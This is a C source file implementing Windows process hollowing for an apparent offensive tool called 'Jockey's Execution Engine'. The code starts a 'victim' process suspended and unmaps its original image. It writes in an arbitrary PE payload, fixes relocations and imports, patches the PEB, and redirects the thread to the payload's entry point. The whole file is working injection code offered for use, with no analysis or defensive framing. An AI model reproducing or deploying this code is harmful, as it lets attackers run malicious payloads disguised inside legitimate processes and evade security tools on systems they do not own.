/* ============================================================================
 * Jockey's Execution Engine -- process_hollowing.c
 * Process hollowing with proper section protections, import resolution,
 * relocation handling, and PEB patching. Clean. No dev comments.
 * ============================================================================ */

#include "../include/injection.h"
#include "../include/pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32

#include <windows.h>
#include <winternl.h>
#include <psapi.h>

/* ------------------------------------------------------------------ */
typedef LONG (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);

#pragma pack(push, 1)
typedef struct {
    WORD  e_magic;    WORD  e_cblp;     WORD  e_cp;
    WORD  e_crlc;     WORD  e_cparhdr;  WORD  e_minalloc;
    WORD  e_maxalloc; WORD  e_ss;       WORD  e_sp;
    WORD  e_csum;     WORD  e_ip;       WORD  e_cs;
    WORD  e_lfarlc;   WORD  e_ovno;     WORD  e_res[4];
    WORD  e_oemid;    WORD  e_oeminfo;  WORD  e_res2[10];
    LONG  e_lfanew;
} MY_DOS_HEADER, *PMY_DOS_HEADER;

typedef struct {
    WORD  Machine;           WORD  NumberOfSections;
    DWORD TimeDateStamp;     DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;   WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} MY_FILE_HEADER, *PMY_FILE_HEADER;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} MY_IMAGE_DATA_DIRECTORY, *PMY_IMAGE_DATA_DIRECTORY;

#ifdef _WIN64
typedef struct {
    WORD  Magic;             BYTE  MajorLinkerVersion;
    BYTE  MinorLinkerVersion;DWORD SizeOfCode;
    DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;   DWORD BaseOfCode;
    ULONGLONG ImageBase;     DWORD SectionAlignment;
    DWORD FileAlignment;     WORD  MajorOperatingSystemVersion;
    WORD  MinorOperatingSystemVersion; WORD  MajorImageVersion;
    WORD  MinorImageVersion; WORD  MajorSubsystemVersion;
    WORD  MinorSubsystemVersion; DWORD Win32VersionValue;
    DWORD SizeOfImage;       DWORD SizeOfHeaders;
    DWORD CheckSum;          WORD  Subsystem;
    WORD  DllCharacteristics;ULONGLONG SizeOfStackReserve;
    ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve;
    ULONGLONG SizeOfHeapCommit;  DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
    MY_IMAGE_DATA_DIRECTORY DataDirectory[16];
} MY_OPTIONAL_HEADER, *PMY_OPTIONAL_HEADER;
#else
typedef struct {
    WORD  Magic;             BYTE  MajorLinkerVersion;
    BYTE  MinorLinkerVersion;DWORD SizeOfCode;
    DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;   DWORD BaseOfCode;
    DWORD BaseOfData;        DWORD ImageBase;
    DWORD SectionAlignment;  DWORD FileAlignment;
    WORD  MajorOperatingSystemVersion; WORD  MinorOperatingSystemVersion;
    WORD  MajorImageVersion; WORD  MinorImageVersion;
    WORD  MajorSubsystemVersion; WORD  MinorSubsystemVersion;
    DWORD Win32VersionValue; DWORD SizeOfImage;
    DWORD SizeOfHeaders;     DWORD CheckSum;
    WORD  Subsystem;         WORD  DllCharacteristics;
    DWORD SizeOfStackReserve;DWORD SizeOfStackCommit;
    DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit;
    DWORD LoaderFlags;       DWORD NumberOfRvaAndSizes;
    MY_IMAGE_DATA_DIRECTORY DataDirectory[16];
} MY_OPTIONAL_HEADER, *PMY_OPTIONAL_HEADER;
#endif

typedef struct {
    DWORD Signature;
    MY_FILE_HEADER FileHeader;
    MY_OPTIONAL_HEADER OptionalHeader;
} MY_NT_HEADERS, *PMY_NT_HEADERS;

typedef struct {
    BYTE  Name[8];
    union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc;
    DWORD VirtualAddress;    DWORD SizeOfRawData;
    DWORD PointerToRawData;  DWORD PointerToRelocations;
    DWORD PointerToLinenumbers; WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;  DWORD Characteristics;
} MY_SECTION_HEADER, *PMY_SECTION_HEADER;

typedef struct {
    DWORD VirtualAddress;
    DWORD SizeOfBlock;
} MY_BASE_RELOCATION, *PMY_BASE_RELOCATION;

typedef struct {
    DWORD OriginalFirstThunk; DWORD TimeDateStamp;
    DWORD ForwarderChain;     DWORD Name;
    DWORD FirstThunk;
} MY_IMAGE_IMPORT_DESCRIPTOR, *PMY_IMAGE_IMPORT_DESCRIPTOR;
#pragma pack(pop)

#define MY_IMAGE_DOS_SIGNATURE          0x5A4D
#define MY_IMAGE_NT_SIGNATURE           0x00004550
#define MY_IMAGE_DIRECTORY_ENTRY_IMPORT 1
#define MY_IMAGE_DIRECTORY_ENTRY_BASERELOC 5
#define MY_IMAGE_REL_BASED_ABSOLUTE     0
#define MY_IMAGE_REL_BASED_HIGHLOW      3
#define MY_IMAGE_REL_BASED_DIR64        10

#define MY_IMAGE_FIRST_SECTION(nt) ((PMY_SECTION_HEADER)((BYTE*)(nt) + \
    sizeof(DWORD) + sizeof(MY_FILE_HEADER) + (nt)->FileHeader.SizeOfOptionalHeader))

/* ------------------------------------------------------------------ */
static DWORD RvaToFileOffset(PMY_NT_HEADERS pNt, DWORD rva) {
    PMY_SECTION_HEADER pSection = MY_IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        DWORD start = pSection[i].VirtualAddress;
        DWORD end   = start + pSection[i].Misc.VirtualSize;
        if (end < start) continue;
        if (rva >= start && rva < end) {
            return pSection[i].PointerToRawData + (rva - start);
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
static BOOL ResolveImportsEx(HANDLE hProcess, LPVOID remoteBase,
                             PMY_NT_HEADERS pNtHeaders, BYTE* pLocalBuffer) {
    DWORD importRVA = pNtHeaders->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD importSize = pNtHeaders->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    if (importRVA == 0 || importSize == 0) {
        LOG_INFO("[DEBUG] No imports to resolve\n");
        return TRUE;
    }

    DWORD importFileOffset = RvaToFileOffset(pNtHeaders, importRVA);
    if (importFileOffset == 0) {
        LOG_INFO("[-] Failed to locate import directory\n");
        return FALSE;
    }

    PMY_IMAGE_IMPORT_DESCRIPTOR pDesc = (PMY_IMAGE_IMPORT_DESCRIPTOR)(pLocalBuffer + importFileOffset);
#ifdef _WIN64
    typedef ULONGLONG MY_THUNK;
#else
    typedef DWORD MY_THUNK;
#endif

    while (pDesc->Name != 0) {
        DWORD nameRVA = pDesc->Name;
        DWORD nameFileOffset = RvaToFileOffset(pNtHeaders, nameRVA);
        if (nameFileOffset == 0) {
            LOG_INFO("[-] Failed to locate DLL name\n");
            return FALSE;
        }
        char* dllName = (char*)(pLocalBuffer + nameFileOffset);

        HMODULE hDll = GetModuleHandleA(dllName);
        if (!hDll) hDll = LoadLibraryA(dllName);
        if (!hDll) {
            LOG_INFO("[-] Failed to load/get handle for %s\n", dllName);
            return FALSE;
        }

        DWORD origThunkRVA = pDesc->OriginalFirstThunk;
        DWORD firstThunkRVA = pDesc->FirstThunk;
        if (origThunkRVA == 0) origThunkRVA = firstThunkRVA;

        DWORD thunkFileOffset = RvaToFileOffset(pNtHeaders, origThunkRVA);
        if (thunkFileOffset == 0) {
            LOG_INFO("[-] Failed to locate thunk table for %s\n", dllName);
            return FALSE;
        }

        MY_THUNK* pThunk = (MY_THUNK*)(pLocalBuffer + thunkFileOffset);
        int thunkIndex = 0;
        while (*pThunk != 0) {
            MY_THUNK thunkValue = *pThunk;
            FARPROC func = NULL;
            if (thunkValue & (sizeof(MY_THUNK) == 8 ? 0x8000000000000000 : 0x80000000)) {
                WORD ordinal = (WORD)(thunkValue & 0xFFFF);
                func = GetProcAddress(hDll, (LPCSTR)(ULONG_PTR)ordinal);
            } else {
                DWORD nameRVA2 = (DWORD)thunkValue;
                DWORD nameFileOffset2 = RvaToFileOffset(pNtHeaders, nameRVA2);
                if (nameFileOffset2 == 0) {
                    LOG_INFO("[-] Failed to locate function name\n");
                    return FALSE;
                }
                char* funcName = (char*)(pLocalBuffer + nameFileOffset2 + 2);
                func = GetProcAddress(hDll, funcName);
                if (!func) {
                    LOG_INFO("[-] Failed to get %s from %s\n", funcName, dllName);
                    return FALSE;
                }
            }
            if (!func) {
                LOG_INFO("[-] Failed to resolve function from %s\n", dllName);
                return FALSE;
            }

            LPVOID iatAddr = (BYTE*)remoteBase + firstThunkRVA + (thunkIndex * sizeof(MY_THUNK));
            if (!WriteProcessMemory(hProcess, iatAddr, &func, sizeof(MY_THUNK), NULL)) {
                LOG_INFO("[-] Failed to write IAT entry for %s\n", dllName);
                return FALSE;
            }
            pThunk++;
            thunkIndex++;
        }
        pDesc++;
    }
    LOG_INFO("[+] Imports resolved\n");
    return TRUE;
}

/* ------------------------------------------------------------------ */
static DWORD MapSectionProtection(DWORD characteristics) {
    if (characteristics & 0x20000000) { /* IMAGE_SCN_MEM_EXECUTE */
        if (characteristics & 0x40000000) return PAGE_EXECUTE_READ;
        if (characteristics & 0x80000000) return PAGE_EXECUTE_READWRITE;
        return PAGE_EXECUTE;
    } else {
        if (characteristics & 0x40000000) {
            if (characteristics & 0x80000000) return PAGE_READWRITE;
            return PAGE_READONLY;
        }
        if (characteristics & 0x80000000) return PAGE_READWRITE;
    }
    return PAGE_READONLY;
}

/* ------------------------------------------------------------------ */
int perform_process_hollowing(InjectionConfig* config) {
    if (!config || !config->payload || config->payloadSize == 0) {
        LOG_ERROR( "[-] Invalid config or payload\n");
        return -1;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    if (!CreateProcessA(NULL, (LPSTR)config->targetImage, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        LOG_ERROR( "[-] CreateProcess failed: %lu\n", GetLastError());
        return -1;
    }

    LOG_INFO("[+] Victim PID: %lu\n", pi.dwProcessId);

    BYTE* pLocalBuffer = (BYTE*)config->payload;

    PMY_DOS_HEADER pDos = (PMY_DOS_HEADER)pLocalBuffer;
    if (pDos->e_magic != MY_IMAGE_DOS_SIGNATURE) {
        LOG_INFO("[-] Invalid DOS header\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return -1;
    }
    PMY_NT_HEADERS pNt = (PMY_NT_HEADERS)(pLocalBuffer + pDos->e_lfanew);
    if (pNt->Signature != MY_IMAGE_NT_SIGNATURE) {
        LOG_INFO("[-] Invalid NT header\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return -1;
    }

    SIZE_T newImageSize = pNt->OptionalHeader.SizeOfImage;
    LPVOID preferredBase = (LPVOID)(uintptr_t)pNt->OptionalHeader.ImageBase;
    LOG_INFO("[+] New PE: Base=%p, Size=0x%zX\n", preferredBase, newImageSize);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        LOG_INFO("[-] Failed to get ntdll.dll\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return -1;
    }

    union {
        FARPROC proc;
        pNtQueryInformationProcess fn;
    } ntQueryInformationProcess = { .proc = GetProcAddress(hNtdll, "NtQueryInformationProcess") };
    union {
        FARPROC proc;
        pNtUnmapViewOfSection fn;
    } ntUnmapViewOfSection = { .proc = GetProcAddress(hNtdll, "NtUnmapViewOfSection") };
    if (!ntQueryInformationProcess.proc || !ntUnmapViewOfSection.proc) {
        LOG_INFO("[-] Failed to resolve NT APIs\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return -1;
    }

    typedef struct {
        LONG ExitStatus; PVOID PebBaseAddress;
        ULONG_PTR AffinityMask; LONG BasePriority;
        ULONG_PTR UniqueProcessId; ULONG_PTR InheritedFromUniqueProcessId;
    } MY_PROCESS_BASIC_INFORMATION;

    MY_PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;
    LONG status = ntQueryInformationProcess.fn(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength);
    if (status < 0) {
        LOG_INFO("[-] NtQueryInformationProcess failed: 0x%08lX\n", (unsigned long)status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return -1;
    }

    LPVOID oldImageBase = NULL;
    SIZE_T bytesReadMem = 0;
#ifdef _WIN64
    SIZE_T pebOffset = 0x10;
#else
    SIZE_T pebOffset = 0x08;
#endif
    BYTE* remotePebImageBase = (BYTE*)pbi.PebBaseAddress + pebOffset;
    if (!ReadProcessMemory(pi.hProcess, remotePebImageBase, &oldImageBase, sizeof(PVOID), &bytesReadMem)) {
        LOG_INFO("[-] Failed to read old ImageBase\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return -1;
    }
    LOG_INFO("[+] Old ImageBase: %p\n", oldImageBase);

    status = ntUnmapViewOfSection.fn(pi.hProcess, oldImageBase);
    if (status < 0) {
        LOG_INFO("[-] NtUnmapViewOfSection failed: 0x%08lX (continuing anyway)\n", (unsigned long)status);
    } else {
        LOG_INFO("[+] Original image unmapped\n");
    }

    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, preferredBase, newImageSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        remoteBase = VirtualAllocEx(pi.hProcess, NULL, newImageSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) {
            LOG_INFO("[-] VirtualAllocEx failed: %lu\n", GetLastError());
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
            return -1;
        }
        LOG_INFO("[+] Allocated at fallback: %p\n", remoteBase);
    } else {
        LOG_INFO("[+] Allocated at preferred: %p\n", remoteBase);
    }

    if (!WriteProcessMemory(pi.hProcess, remotePebImageBase, &remoteBase, sizeof(PVOID), &bytesReadMem)) {
        LOG_INFO("[-] Failed to update PEB\n");
        goto fail;
    }
    LOG_INFO("[+] PEB ImageBase updated\n");

    if (!WriteProcessMemory(pi.hProcess, remoteBase, pLocalBuffer, pDos->e_lfanew, NULL)) {
        LOG_INFO("[-] Write DOS stub failed\n");
        goto fail;
    }

    LPVOID remoteNt = (BYTE*)remoteBase + pDos->e_lfanew;
    DWORD ntSize = sizeof(DWORD) + sizeof(MY_FILE_HEADER) + pNt->FileHeader.SizeOfOptionalHeader;
    if (!WriteProcessMemory(pi.hProcess, remoteNt, pLocalBuffer + pDos->e_lfanew, ntSize, NULL)) {
        LOG_INFO("[-] Write NT headers failed\n");
        goto fail;
    }

    DWORD offset = (DWORD)((BYTE*)&pNt->OptionalHeader.ImageBase - (BYTE*)pNt);
    if (!WriteProcessMemory(pi.hProcess, (BYTE*)remoteNt + offset, &remoteBase, sizeof(PVOID), NULL)) {
        LOG_INFO("[-] Warning: patch ImageBase failed\n");
    }

    PMY_SECTION_HEADER pSection = MY_IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (BYTE*)remoteBase + pSection[i].VirtualAddress;
        LPVOID src  = pLocalBuffer + pSection[i].PointerToRawData;
        if (pSection[i].SizeOfRawData > 0) {
            if (!WriteProcessMemory(pi.hProcess, dest, src, pSection[i].SizeOfRawData, NULL)) {
                LOG_INFO("[-] Write section [%s] failed\n", pSection[i].Name);
                goto fail;
            }
            LOG_INFO("[+] Section [%s] written\n", pSection[i].Name);
        }
    }

    LPVOID origBase = (LPVOID)(uintptr_t)pNt->OptionalHeader.ImageBase;
    if (remoteBase != origBase) {
        DWORD relocRVA = pNt->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relocSize = pNt->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        if (relocRVA == 0 || relocSize == 0) {
            LOG_INFO("[-] No relocs, but base changed!\n");
            goto fail;
        }
        DWORD relocFileOffset = RvaToFileOffset(pNt, relocRVA);
        if (relocFileOffset == 0) {
            LOG_INFO("[-] Could not map relocation RVA to file offset\n");
            goto fail;
        }
        BYTE* pRelocDir = pLocalBuffer + relocFileOffset;
        DWORD offsetReloc = 0;
        while (offsetReloc < relocSize) {
            PMY_BASE_RELOCATION pBlock = (PMY_BASE_RELOCATION)(pRelocDir + offsetReloc);
            if (pBlock->SizeOfBlock == 0) break;
            DWORD entryCount = (pBlock->SizeOfBlock - sizeof(MY_BASE_RELOCATION)) / sizeof(WORD);
            WORD* pEntry = (WORD*)(pBlock + 1);
            LONGLONG delta = (BYTE*)remoteBase - (BYTE*)origBase;
            for (DWORD j = 0; j < entryCount; j++) {
                WORD type = pEntry[j] >> 12;
                WORD off  = pEntry[j] & 0xFFF;
                if (type == MY_IMAGE_REL_BASED_ABSOLUTE) continue;
                LPVOID patchAddr = (BYTE*)remoteBase + pBlock->VirtualAddress + off;
                ULONG_PTR val = 0;
                if (!ReadProcessMemory(pi.hProcess, patchAddr, &val, sizeof(ULONG_PTR), NULL)) {
                    LOG_INFO("[-] Read reloc failed at %p\n", patchAddr);
                    goto fail;
                }
                val += delta;
                if (!WriteProcessMemory(pi.hProcess, patchAddr, &val, sizeof(ULONG_PTR), NULL)) {
                    LOG_INFO("[-] Write reloc failed at %p\n", patchAddr);
                    goto fail;
                }
            }
            offsetReloc += pBlock->SizeOfBlock;
        }
        LOG_INFO("[+] Relocations applied\n");
    } else {
        LOG_INFO("[+] No relocations needed\n");
    }

    if (!ResolveImportsEx(pi.hProcess, remoteBase, pNt, pLocalBuffer)) {
        goto fail;
    }

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        LPVOID secBase = (BYTE*)remoteBase + pSection[i].VirtualAddress;
        SIZE_T secSize = pSection[i].Misc.VirtualSize
                       ? pSection[i].Misc.VirtualSize
                       : pSection[i].SizeOfRawData;
        DWORD prot = MapSectionProtection(pSection[i].Characteristics);
        DWORD oldProt = 0;
        VirtualProtectEx(pi.hProcess, secBase, secSize, prot, &oldProt);
    }
    LOG_INFO("[+] Section protections applied\n");

    DWORD entryRVA = pNt->OptionalHeader.AddressOfEntryPoint;
    LPVOID entry = (BYTE*)remoteBase + entryRVA;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        LOG_INFO("[-] GetThreadContext failed\n");
        goto fail;
    }
#ifdef _WIN64
    ctx.Rip = (DWORD64)entry;
    ctx.Rcx = (DWORD64)remoteBase;
    ctx.Rdx = 0;
    ctx.R8  = 0;
#else
    ctx.Eip = (DWORD)entry;
    ctx.Eax = (DWORD)remoteBase;
#endif
    if (!SetThreadContext(pi.hThread, &ctx)) {
        LOG_INFO("[-] SetThreadContext failed\n");
        goto fail;
    }
    LOG_INFO("[+] Thread context updated to entry %p\n", entry);

    ResumeThread(pi.hThread);
    LOG_INFO("[+] Thread resumed! Process hollowed successfully.\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;

fail:
    VirtualFreeEx(pi.hProcess, remoteBase, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return -1;
}

#else
int perform_process_hollowing(InjectionConfig* config) {
    (void)config;
    LOG_ERROR( "[-] Process hollowing not implemented on Linux\n");
    return -1;
}
#endif
